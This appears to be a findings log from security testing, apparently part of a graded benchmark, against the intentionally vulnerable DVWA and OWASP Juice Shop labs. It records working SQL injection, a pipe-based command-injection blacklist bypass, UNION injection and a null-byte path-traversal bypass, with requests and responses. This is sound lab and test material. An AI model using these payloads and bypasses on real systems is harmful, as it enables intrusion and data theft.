findings.title: SQL Injection in sqli id parameter (DVWA low)

TRUE payload `1' OR '1'='1` returned MULTIPLE seeded user records with surnames: admin (admin), Gordon Brown, Hack Me, Pablo Picasso, Bob Smith. FALSE payload `1' AND '1'='2` returned ZERO records (User ID: with no First name/Surname rows). The boolean condition controls the result set, proving SQL injection.

findings.title: OS Command Injection (HIGH) via pipe without trailing space blacklist bypass
findings.response_evidence: [security=high] Page footer shows 'Security Level: high'. HIGH blacklist blocks '; ', '| ' (pipe+space), and '&&'. Bypass used a pipe with NO trailing space: ip=127.0.0.1|whoami. Response pre block contained the web-process identity 'www-data', proving OS command execution as the web user at HIGH security.

findings.title: Product-Search SQL Injection (UNION) on /rest/products/search
request_sequence: GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (unauth) -> HTTP 200 successful 9-column UNION
findings.response_evidence: Single quote injection triggered SQL error: HTTP 500, body 'Error: SQLITE_ERROR: near "'%'": syntax error' (Express ^4.17.1). The 9-column UNION injection returned HTTP 200 with the injected constants mapped directly into result columns, proving UNION-based injection: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. Both the SQL error AND successful UNION confirm injection.

findings.title: Unauthenticated /api/Feedbacks access — author emails are MASKED, PII disclosure not met
findings.response_evidence: GET /api/Feedbacks returns HTTP 200 WITHOUT authentication and discloses feedback records with UserId and comment. However, the per-criterion requirement is disclosure of AUTHOR EMAIL ADDRESSES (PII). The emails embedded in comments are MASKED/redacted, not full addresses: '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'. No complete author email address is exposed, so the PII-disclosure behavioral criterion is NOT satisfied. Rejecting this instance; endpoint is unauthenticated but emails are obfuscated. (Note: UserId values 1,2,3,21 are exposed, which is a weaker exposure than full email PII.)

findings.title: Poison Null-Byte Path Traversal under /ftp/ bypasses .md/.pdf extension filter to retrieve package.json.bak
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth) -> HTTP 403, body: 'Error: Only .md and .pdf files are allowed! at verify (/juice-shop/build/routes/fileServer.js:55:18)'
GET http://juiceshop:3000/ftp/package.json.bak%2500.md (unauth) -> HTTP 200, Content-Type: application/octet-stream, returns raw package.json backup contents
findings.response_evidence:
BASELINE (raw path): GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js:55 (verify), confirming the .bak extension is filtered/blocked.

BYPASS (null-byte): GET /ftp/package.json.bak%2500.md returned HTTP 200 with Content-Type application/octet-stream and the actual confidential backup file content. The URL-encoded null byte (%2500 = %00) truncates the filename at the OS layer after the extension-allow-list check passes against the trailing '.md', exposing the restricted .bak file.

Quoted excerpt of retrieved package.json.bak content:
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application",
  "homepage": "http://owasp-juice.shop",
  "author": "Björn Kimminich <bjoern.kimminich@owasp.org> ...",
  ...
  "dependencies": { "express": "~4.16", "express-jwt": "0.1.3", "sanitize-html": "1.4.2", "sqlite3": "~3.1.13", ... }
}

Both required conditions demonstrated: 403 on the raw .bak path AND HTTP 200 with restricted backup file content via the %2500.md null-byte bypass.
